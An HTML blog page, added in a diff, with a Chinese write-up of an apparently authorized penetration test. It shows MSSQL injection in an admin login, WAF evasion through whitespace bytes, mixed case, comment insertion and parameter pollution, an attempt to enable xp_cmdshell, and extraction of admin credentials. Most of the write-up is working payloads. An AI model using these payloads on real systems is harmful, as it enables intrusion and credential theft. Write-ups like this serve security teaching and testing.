@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kyrie403.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本次测试为授权测试。注入点在后台登陆的用户名处。  存在验证码，可通过删除Cookie和验证码字段绕过验证   添加一个单引号，报错  1and &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1  连接重置——被WAF拦截  改变大小写并将空格替换为MSSQL空白符[0x00-0x20] 1%1eaNd%1e&amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1   查询数据库版本，MSSQL 2012 x64 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次实战MSSQL注入绕过WAF">
+<meta property="og:url" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="本次测试为授权测试。注入点在后台登陆的用户名处。  存在验证码，可通过删除Cookie和验证码字段绕过验证   添加一个单引号，报错  1and &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1  连接重置——被WAF拦截  改变大小写并将空格替换为MSSQL空白符[0x00-0x20] 1%1eaNd%1e&amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1   查询数据库版本，MSSQL 2012 x64 1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypasswaf_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_1_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_1_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_4.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_0.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_1.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_3.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_2.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_5.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_7.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_8.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_9.png">
+<meta property="og:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_11.png">
+<meta property="article:published_time" content="2019-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-30T15:58:11.251Z">
+<meta property="article:author" content="kyrie403">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypasswaf_0.png">
+
+<link rel="canonical" href="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>记一次实战MSSQL注入绕过WAF | Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://kyrie403.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kyrie403">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次实战MSSQL注入绕过WAF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-01 2020-01-01T00:00:00+08:00" itemprop="dateCreated datePublished" datetime="2020-01-01T00:00:00+08:00">2020-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09 2021-09-30T23:58:11+08:00" itemprop="dateModified" datetime="2021-09-30T23:58:11+08:00">2021-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本次测试为授权测试。注入点在后台登陆的用户名处。</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypasswaf_0.png" alt="mssql_bypasswaf_0"></p>
+<p>存在验证码，可通过删除Cookie和验证码字段绕过验证</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0_0.png" alt="mssql_bypass_waf_0_1"></p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0_1.png" alt="mssql_bypass_waf_0_0_1"></p>
+<p>添加一个单引号，报错</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_0.png" alt="mssql_bypass_waf_0_0"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>连接重置——被WAF拦截</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_1.png" alt="mssql_bypass_waf_0_1"></p>
+<p>改变大小写并将空格替换为MSSQL空白符[0x00-0x20]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eaNd%1e&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_2.png" alt="mssql_bypass_waf_0_2"></p>
+<p>查询数据库版本，MSSQL 2012 x64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=@@version%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_1_1.png" alt="mssql_bypass_waf_1_1"></p>
+<p>查询当前用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=user%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_0_3.png" alt="mssql_bypass_waf_0_3"></p>
+<p>查询当前用户是否为dba和db_owner</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;if(0=(SelEct%1eis_srvrolemember(&#x27;sysadmin&#x27;))) WaItFOR%1edeLAY%1e&#x27;0:0:5&#x27;%1e --</span><br><span class="line">;if(0=(SelEct%1eis_srvrolemember(&#x27;db_owner&#x27;))) WaItFOR%1edeLAY%1e&#x27;0:0:5&#x27;%1e --</span><br></pre></td></tr></table></figure>
+
+<p>均出现延时，当前用户既不是dba也不是db_owner</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_1_2.png" alt="mssql_bypass_waf_1_2"></p>
+<p>尝试执行xp_cmdsehll，没有相关权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;eXeC%1esp_configure%1e&#x27;show advanced options&#x27;,1;RECONFIGURE%1e --</span><br><span class="line">;eXeC%1esp_configure%1e&#x27;xp_cmdshell&#x27;,1;RECONFIGURE%1e --</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_3.png" alt="mssql_bypass_waf_2_3"></p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_4.png" alt="mssql_bypass_waf_2_4"></p>
+<p>查询当前数据库，连接重置——被WAF拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(db_name()%1e)%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_0.png" alt="mssql_bypass_waf_2_0_0"></p>
+<p>去掉函数名的一个字符则正常返回——WAF过滤了函数db_name()。MSSQL和MSQL有一些相同的特性，比如：函数名和括号之前可用注释或空白符填充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(db_name/**/()%1e)%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_1.png" alt="mssql_bypass_waf_2_0_1"></p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_2_0_2.png" alt="mssql_bypass_waf_2_0_2"></p>
+<p>查询当前数据库的表，连接重置——被WAF拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct%1etop%1e1%1etaBle_nAme from%1einfOrmatiOn_sChema.tAbles%1e)%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_0.png" alt="mssql_bypass_waf_3_0_0"></p>
+<p>删除select后面的语句，返回正常。在IIS+ASPX的环境里，如果同时提交多个同名参数，则服务端接收的参数的值为用逗号连接的多个值，在实际应用中可借助注释符注释掉逗号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1etop%1e1%1etaBle_nAme from%1einfOrmatiOn_sChema.tAbles%1e)%1e--</span><br></pre></td></tr></table></figure>
+
+<p>依然被拦截</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_1.png" alt="mssql_bypass_waf_3_0_1"></p>
+<p>删除infOrmatiOn_sChema.tAbles的一个字符则返回正常——WAF过滤了infOrmatiOn_sChema.tAbles。以前在学习MYSQL注入时看到官方文档有这样一句话：”The qualifier character is a separate token and need not be contiguous with the associated identifiers.” 可知限定符(例如’.’)左右可插入空白符，而经过测试MSSQL具有相同的特性。infOrmatiOn_sChema.tAbles -&gt; infOrmatiOn_sChema%0f.%0ftAbles</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1etop%1e1%1etaBle_nAme from%1einfOrmatiOn_sChema%0f.%0ftAbles%1e)%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_3.png" alt="mssql_bypass_waf_3_3"></p>
+<p>可通过not in(‘table_1’,’table_2’…)的方式遍历表名</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_0_2.png" alt="mssql_bypass_waf_3_0_2"></p>
+<p>手工注入使用这种方法太慢，一次性查询所有表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1equotename(name)%1efRom bak_ptfl%0f..sysobjects%1ewHerE%1extype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_5.png" alt="mssql_bypass_waf_3_5"></p>
+<p>根据表名判断管理员表应该为appsadmin，一次性查询该表的所有列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1equotename/**/(name)%1efRom bak_ptfl%0f..syscolumns%1ewHerE%1eid=(selEct/*&amp;username=*/%1eid%1efrom%1ebak_ptfl%0f..sysobjects%1ewHerE%1ename=&#x27;appsadmin&#x27;)%1efoR%1eXML%1ePATH/**/(&#x27;&#x27;))%1e--&amp;password=admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_7.png" alt="mssql_bypass_waf_3_7"></p>
+<p>获得管理员用户名和密码字段：AdminName、Password。查询用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1etOp%1e1%1eAdminName%1efRom%1eappsadmin%1e)%1e--</span><br><span class="line">%1eoR%1e1=(SelEct/*&amp;username=*/%1etOp%1e1%1epassword%1efRom%1eappsadmin)%1e--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_8.png" alt="mssql_bypass_waf_3_8"></p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_9.png" alt="mssql_bypass_waf_3_9"></p>
+<p>解密后成功登陆后台</p>
+<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/mssql_bypass_waf_3_11.png" alt="mssql_bypass_waf_3_10"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="ThinkPHP5.0.xSQL注入漏洞分析">
+      <i class="fa fa-chevron-left"></i> ThinkPHP5.0.xSQL注入漏洞分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">kyrie403</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kyrie403</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
